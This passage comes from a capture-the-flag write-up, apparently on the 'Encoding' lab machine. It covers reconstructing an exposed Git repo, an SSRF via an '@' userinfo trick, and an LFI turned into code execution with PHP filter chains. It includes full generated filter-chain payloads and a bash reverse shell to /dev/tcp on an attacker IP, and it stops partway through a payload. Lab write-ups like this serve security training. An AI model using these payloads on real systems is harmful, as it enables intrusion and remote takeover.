040000 tree 26c6c873fe81c801d731e417bf5d92e5bfa317d2    actions
040000 tree 9a515b22daea1a74bbcf5d348ad9339202a8edd6    assets
040000 tree 2aa032b5df9bbaeedff30b6e13be938e48cae5f4    includes
100644 blob 72f0e39a9438fc0f915f63e2f26b762eb170cf8b    index.php
040000 tree e074c833c28d3b024eeea724cf892a440f89a5aa    scripts
100644 blob ec9b154d84cab1888e2724c1083bf97eb57837c9    utils.php

```

This one references more trees and blobs. If I try a `git status` right now, it complains that the top tree item is missing:

```

oxdf@hacky$ git status 
fatal: unable to read tree 26c6c873fe81c801d731e417bf5d92e5bfa317d2

```

I’ll download the file as before, then run `git status` to see if anything is missing, and after a handful more, I get:

```

oxdf@hacky$ git status 
On branch master
Changes to be committed:
  (use "git restore --staged <file>..." to unstage)
        deleted:    actions/action_handler.php
        deleted:    actions/image2pdf.php
        deleted:    assets/img/forestbridge.jpg
        deleted:    includes/coming_soon.html
        deleted:    index.php
        deleted:    scripts/git-commit.sh
        deleted:    utils.php

```

That’s saying that the repo shows those files in the last commit, but they are not on disk now, so it’s showing them as deleted.

Running `git reset --hard` shows a few more missing objects:

```

oxdf@hacky$ git reset --hard
error: unable to read sha1 file of actions/action_handler.php (2d600ee8a453abd9bd515c41c8fa786b95f96f82)
error: unable to read sha1 file of actions/image2pdf.php (e69de29bb2d1d6434b8b29ae775ad8c2e48c5391)
error: unable to read sha1 file of assets/img/forestbridge.jpg (62370b37f2f05b910c76c23d1d4ce9f7e3413ea6)
error: unable to read sha1 file of includes/coming_soon.html (f9d432448807f47dfd13cb71acc3fd6890f21ee0)
error: unable to read sha1 file of index.php (72f0e39a9438fc0f915f63e2f26b762eb170cf8b)
error: unable to read sha1 file of scripts/git-commit.sh (c1308cdc2b0fac3eb5b1e0872cdec44941ff22f5)
error: unable to read sha1 file of utils.php (ec9b154d84cab1888e2724c1083bf97eb57837c9)
fatal: Could not reset index file to revision 'HEAD'.

```

Once I download those, it works:

```

oxdf@hacky$ git reset --hard
HEAD is now at 9c17e53 Updated scripts!
oxdf@hacky$ git status 
On branch master
nothing to commit, working tree clean
oxdf@hacky$ ls
actions  assets  includes  index.php  scripts  utils.php

```

#### git-dumper

One of the reasons I wrote the Proxy the way I did was so that I could just use a tool like [git-dumper](https://github.com/arthaud/git-dumper) to download the repo. It’ll make requests to `http://localhost:5000/var/www/image/.git/` and the results will be the files it needs, as if they were hosted on that host. The only trick is that `git-dumper` is a bit picky about the `content-type` response header, so I had to make sure to set that in the proxy.

For some reason, I get an error having to do with downloading the all 0 object (seems like an error), and it says it’s corrupt, but it works fine for my purposes:

```

oxdf@hacky$ git-dumper http://localhost:5000/var/www/image/.git git-dumper/                                          
[-] Testing http://localhost:5000/var/www/image/.git/HEAD [200]
[-] Testing http://localhost:5000/var/www/image/.git/ [200]
[-] Fetching common files
[-] Fetching http://localhost:5000/var/www/image/.git/description [200]
[-] Fetching http://localhost:5000/var/www/image/.gitignore [200]
[-] Fetching http://localhost:5000/var/www/image/.git/hooks/applypatch-msg.sample [200]                      
[-] Fetching http://localhost:5000/var/www/image/.git/hooks/commit-msg.sample [200]
...[snip]...
[-] Fetching http://localhost:5000/var/www/image/.git/objects/00/00000000000000000000000000000000000000 [200]
Task 0000000000000000000000000000000000000000 raised exception:
Traceback (most recent call last):
...[snip]...
dulwich.objects.EmptyFileException: Corrupted empty file detected
[-] Running git checkout .
oxdf@hacky$ ls
actions  assets  includes  index.php  scripts  utils.php

```

### image Source Analysis

#### Overview

After filtering out the files in `.git`, only a handful remain:

```

oxdf@hacky$ find . -path ./.git -prune -o -type f -print
./includes/coming_soon.html
./utils.php
./index.php
./actions/action_handler.php
./actions/image2pdf.php
./assets/img/forestbridge.jpg
./.gitignore
./scripts/git-commit.sh

```

I’ve already looked at `index.php` and `utils.php`. `git-commit.sh` involves committing to the local Git repo and is invoked via the API. I’ll come back to this script later, but for now, I’ll just say that I cannot conceive of a reason why someone would want this functionality in an API.

#### actions

The `actions` directory has two files in it. `image2pdf.php` is empty. It’s not clear at this time if that’s an issue with how the repo was reconstructed or if it’s truly empty, but it is empty in both the `git-dumper` and manually reconstructed repo (once I get a shell I can confirm it’s empty on Encoding as well).

`action_handler.php` seems like it’s the start of a new main page:

```

<?php

include_once 'utils.php';

if (isset($_GET['page'])) {
    $page = $_GET['page'];
    include($page);

} else {
    echo jsonify(['message' => 'No page specified!']);
}

?>

```

It doesn’t really do much yet, but it has an obvious file include vulnerability, as the user controls the `page` parameter.

### SSRF in haxtables.htb

The intended way to exploit this box was through an SSRF in `haxtables.htb`. There’s a shortcut I’ll show in [Beyond Root](#beyond-root).

#### URI Structure

[RFC 3986 Appendix-A](https://www.rfc-editor.org/rfc/rfc3986#appendix-A) shows the format of a URI. Pulling out the parts that matter here:

```

   URI           = scheme ":" hier-part [ "?" query ] [ "#" fragment ]

   hier-part     = "//" authority path-abempty
                 / path-absolute
                 / path-rootless
                 / path-empty
...[snip]...
   scheme        = ALPHA *( ALPHA / DIGIT / "+" / "-" / "." )

   authority     = [ userinfo "@" ] host [ ":" port ]
   userinfo      = *( unreserved / pct-encoded / sub-delims / ":" )
   host          = IP-literal / IPv4address / reg-name
   port          = *DIGIT
...[snip]...

```

So a URL can look like:

```

[scheme]://[authority][path-abempty]

```

For this case, `scheme` is `http`. `authority` is the `host`, but it can have an optional `:[port]` after it, and an optional `[userinfo]@` before it. `path-abempty` is either empty or starts with `/`.

#### SSRF

In the `make_api_call` function, it takes user input to build a URL that is passed to `curl`:

```

$url = 'http://api.haxtables.htb' . $uri_path . '/index.php';

```

It’s clear that this can be any path on `api.haxtables.htb` that ends with `/index.php`. But because there’s no `/` between `.htb` and the user input, I can actually use this to reach other servers as well by adding an `@` symbol.

If I send `@10.10.14.6` as the `$uri_path`, then `$url` will be:

```

http://api.hacktables.htb@10.10.14.6/index.php

```

I’ll send the POST request to `haxtables.htb/handler.php` into Burp Repeater and update the `uri_path`:

```

POST /handler.php HTTP/1.1
Host: haxtables.htb
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/111.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json;charset=UTF-8
Content-Length: 69
Origin: http://10.10.11.198
Connection: close
Referer: http://10.10.11.198/index.php?page=string

{"action":"md5","data":"0xdf was here","uri_path":"@10.10.14.6"}

```

I’ll start `nc` listening on 80 and on sending the above request, there’s a request at `nc` from Encoding:

```

POST /index.php HTTP/1.1
Host: 10.10.14.6
Authorization: Basic YXBpLmhheHRhYmxlcy5odGI6
Accept: */*
Content-Type:application/json
Content-Length: 64

{"data":"0xdf was here","action":"md5","uri_path":"@10.10.14.6"}

```

Rather than sending to `api.haxtables.htb`, it’s hit my server. The `Authorization` header has base64 data that decodes to that `userinfo`:

```

oxdf@hacky$ echo "YXBpLmhheHRhYmxlcy5odGI6" | base64 -d
api.haxtables.htb:

```

### LFI -> RCE

#### Background

It used to be that to take an local file include (LFI) to remote code execution (RCE), you needed to get malicious PHP code into a file on the server somewhere, by abusing an unsafe file upload or something like log poisoning.

Then came PHP filter injection, explained in detail in [this Synacktiv post](https://www.synacktiv.com/publications/php-filters-chain-what-is-it-and-how-to-use-it.html), perhaps first published in [this CTF writeup](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d). I went into this technique in the [Beyond Root for UpDown](/2023/01/21/htb-updown.html#beyond-root---lfi2rce-via-php-filters) and made [this video](https://www.youtube.com/watch?v=TnLELBtmZ24) showing it in detail:

The summary is that by stacking many PHP filters encoding and re-encoding a temporary empty file over and over, eventually I can actually add legit PHP that gets included and executed.

#### POC

[This repo](https://github.com/synacktiv/php_filter_chain_generator) has a Python script to generate the filters necessary to inject PHP code into a page. To test, I’ll try to generate a PHP filters to run `phpinfo()`:

```

oxdf@hacky$ python php_filter_chain_generator.py --chain '<?php phpinfo(); ?>  '
[+] The following gadget chain will generate the following code : <?php phpinfo(); ?>   (base64 value: PD9waHAgcGhwaW5mbygpOyA/PiAg)
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp

```

I’m going to use the SSRF to hit `image.haxtables.htb/actions/action_handler.php` with a `page` parameter of the filters above. `/index.php` will be appended to the end, but that doesn’t matter, as `php://temp/index.php` will be a valid PHP temp file.

When I put this into Repeater, it works:

[![image-20230412095538974](/img/image-20230412095538974.png)*Click for full size image*](/img/image-20230412095538974.png)

#### Shell

I’ll generate another filter chain, this time with a [Bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw):

```

oxdf@hacky$ python php_filter_chain_generator.py --chain '<?php system("bash -c \"bash -i >& /dev/tcp/10.10.14.6/443 0>&1 \""); ?>'
[+] The following gadget chain will generate the following code : <?php system("bash -c \"bash -i >& /dev/tcp/10.10.14.6/443 0>&1 \""); ?> (base64 value: PD9waHAgc3lzdGVtKCJiYXNoIC1jIFwiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42LzQ0MyAwPiYxIFwiIik7ID8+)
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.ISO-8859-14.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert